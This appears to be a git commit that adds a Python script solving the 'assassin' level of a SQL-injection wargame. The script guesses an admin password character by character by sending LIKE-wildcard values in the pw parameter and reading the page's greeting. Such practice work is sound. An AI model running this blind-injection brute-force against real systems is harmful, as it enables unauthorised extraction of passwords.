685f29b5708e129e5baf3b0f68b5b7873eee777d
JH0814 <40225003+JH0814@users.noreply.github.com>
2025-02-28 16:04:44 +0900

    Add files via upload

---
+++ assassin-1.py
@@ -0,0 +1,17 @@
+import requests
+
+url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw='
+cookie = {'PHPSESSID' : 'COOKIE'}
+
+ans = []
+pre_ans = []
+
+for j in range(48, 123):
+    test = url + chr(j) + "%"
+    res = requests.get(test, cookies=cookie)
+    if 'Hello guest' in res.text:
+        ans.append(chr(j))
+    if 'Hello admin' in res.text:
+        pre_ans.append(chr(j))
+print(ans)
+print(pre_ans)
